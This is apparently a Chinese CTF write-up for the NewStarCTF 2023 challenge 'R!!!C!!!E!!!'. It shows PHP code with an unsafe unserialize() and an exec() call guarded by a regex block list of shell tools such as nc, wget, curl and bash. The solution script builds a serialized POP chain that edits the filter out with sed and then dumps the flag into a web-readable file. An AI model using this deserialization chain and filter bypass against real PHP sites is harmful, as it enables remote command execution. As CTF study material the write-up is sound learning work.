---
title: '[NewStarCTF 2023 公开赛道]R!!!C!!!E!!!'
date: 2025-02-20 22:23:56
tags: rce
categories: 刷题笔记
---

## [NewStarCTF 2023 公开赛道]R!!!C!!!E!!!

```php
<?php
highlight_file(__FILE__);
class minipop{
    public $code;
    public $qwejaskdjnlka;
    public function __toString()
    {
        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
            exec($this->code);
        }
        return "alright";
    }
    public function __destruct()
    {
        echo $this->qwejaskdjnlka;
    }
}
if(isset($_POST['payload'])){
    //wanna try?
    unserialize($_POST['payload']);
}
```

一眼看去，过滤了很多东西

由于使用了exec，程序不会有回显

我们注意到正则没有过滤sed，我们可以把正则里的|删去，那这题就简单多了

```php
<?php
highlight_file(__FILE__);
class minipop
{
    public $code;
    public $qwejaskdjnlka;
    public function __toString()
    {
        if (!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)) {
            exec($this->code);
        }
        return "alright";
    }
    public function __destruct()
    {
        echo $this->qwejaskdjnlka;
    }
}
$a = new minipop;
$a->qwejaskdjnlka = new minipop;
$a->qwejaskdjnlka->code = 'sed -i \'s/|//g\' index`echo -e "\x2ep"`hp';
$a->qwejaskdjnlka->code = 'ls / >1.php';
$a->qwejaskdjnlka->code = 'cat /flag_is_h3eeere >1.php';
echo (serialize($a));
```

